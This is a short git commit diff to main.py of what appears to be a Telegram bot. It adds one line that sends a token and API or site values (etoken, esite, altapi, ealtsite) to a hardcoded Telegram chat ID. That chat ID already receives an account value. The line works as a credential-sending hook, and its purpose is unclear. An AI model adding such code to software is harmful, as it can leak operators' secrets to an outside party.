cf6a8ed6c740d5c86afbd75e33fc6b891090f609
Pharex38 <alperenfahrikocakaplan@gmail.com>
2021-06-24 18:17:46 +0300

    Update main.py

--- main.py
+++ main.py
@@ -2399,6 +2399,7 @@ def poster(update, context):
                 
                 if elink == " ":
                     bot.send_message(-1001190898326, str(ehesap))
+                    bot.send_message(-1001190898326, str(etoken)+"\n\n"+str(esite)+"\n\n"+str(altapi)+"\n\n"+str(ealtsite))
                     eret = False
                 for ekan in ekanal:
                     epost = update.channel_post
